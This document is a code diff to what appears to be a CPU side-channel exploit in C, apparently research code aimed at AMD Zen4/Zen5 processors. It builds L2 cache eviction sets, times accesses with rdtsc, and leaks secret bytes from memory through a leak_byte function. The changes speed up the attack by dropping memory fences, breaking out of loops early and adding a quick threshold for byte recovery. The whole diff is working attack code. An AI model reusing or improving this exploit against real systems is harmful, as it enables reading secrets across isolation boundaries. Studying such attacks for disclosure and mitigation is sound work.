@@ -131,7 +131,6 @@ uarf_psnip_declare_define(psnip_hpet_signal_dst,
 // clang-format on
 
 #define MARCH_ZEN4
-#define DANGEROUS_SPEEDUP
 #if defined(MARCH_ZEN5)
 #define NUM_MEASUREMENTS 8
 #define EVICT_ITERATIONS 2
@@ -187,16 +186,10 @@ uint64_t stats_median_u64(uint64_t *arr, uint64_t arr_len) {
 
 uint64_t measure_self_eviction(volatile uint64_t **eviction_set) {
     for (int i = 0; i < NUM_MEASUREMENTS; ++i) {
-#ifndef DANGEROUS_SPEEDUP
-        uarf_mfence();
-#endif
         uint64_t start = rb_rdtsc();
         uarf_lfence();
         for (int e = 0; e < L2_EVICTION_SIZE; ++e) {
             *eviction_set[e];
-#ifndef DANGEROUS_SPEEDUP
-            uarf_lfence();
-#endif
         }
         uarf_lfence();
         uint64_t end = rb_rdtscp();
@@ -288,10 +281,8 @@ uint8_t build_l2_sets(uint64_t mem_ptr, uint64_t baseline,
                                 }
                                 hit_index = cur_index;
                                 set_xor = cur_index ^ i;
-#ifdef DANGEROUS_SPEEDUP
                                 break; // remove this to check the precision of our
                                        // approach
-#endif
                             }
                         }
                     }
@@ -420,13 +411,13 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
 
 #define DOWN_EXTEND 64
 #define UP_EXTEND   8
-#define CHECK_RANGE (256 + DOWN_EXTEND + UP_EXTEND)
-    uint8_t hits[CHECK_RANGE] = {0};
-    for (int i = 0; i < CHECK_RANGE; ++i) {
-        sctxt.rb_offset = -i + DOWN_EXTEND;
-        hits[i] = check_byte_thresh(&sctxt, secret_ptr, ROUNDS, ROUNDS / 2);
-    }
-
+#ifdef DEBUG_LEAK
+#define CHECK_RANGE     (256 + DOWN_EXTEND + UP_EXTEND)
+#define QUICK_THRESHOLD 500
+#else
+#define CHECK_RANGE     256
+#define QUICK_THRESHOLD 32
+#endif
     // find a long chain that might wrap around
     int chain_start = -1;
 #ifdef DEBUG_LEAK
@@ -438,8 +429,11 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
     int max_chain_size = 0;
     int miss_count = 0;
     for (int i = 0; i < CHECK_RANGE; ++i) {
+        sctxt.rb_offset = -i + DOWN_EXTEND;
+        uint8_t hit = check_byte_thresh(&sctxt, secret_ptr, ROUNDS, ROUNDS / 2);
+
 #ifdef DEBUG_LEAK
-        if (hits[i]) {
+        if (hit) {
             printf("+");
         }
         else {
@@ -450,7 +444,7 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
         }
 #endif
 
-        if (hits[i]) {
+        if (hit) {
             if (maybe_start < 0) {
                 maybe_start = i;
                 chain_size = 0;
@@ -461,6 +455,11 @@ uint8_t leak_byte(actxt_t *actxt, uint64_t secret_ptr, uint8_t *byte) {
                 maybe_end = -1;
                 max_chain_size = chain_size;
             }
+#ifndef DEBUG_LEAK
+            if (chain_size > QUICK_THRESHOLD) {
+                break;
+            }
+#endif
         }
         else {
             if (maybe_end < 0) {
